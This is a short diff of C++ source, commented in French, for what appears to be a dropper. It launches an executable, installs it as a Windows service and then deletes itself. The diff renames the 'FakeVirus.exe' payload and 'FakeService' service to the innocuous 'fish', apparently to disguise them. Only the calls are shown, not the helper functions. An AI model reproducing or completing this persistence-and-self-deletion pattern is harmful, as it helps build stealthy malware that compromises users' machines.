@@ -130,11 +130,11 @@ int main() {
     }
 
     // Lancer FakeVirus.exe
-    string fakeVirusPath = fishFolder + "\\FakeVirus.exe";
+    string fakeVirusPath = fishFolder + "\\fish.exe";
     ExecuteFile(fakeVirusPath);
 
     // Installer le service Windows
-    InstallService("FakeService", fakeVirusPath);
+    InstallService("fish", fakeVirusPath);
 
     // S'auto-supprimer
     SelfDelete();
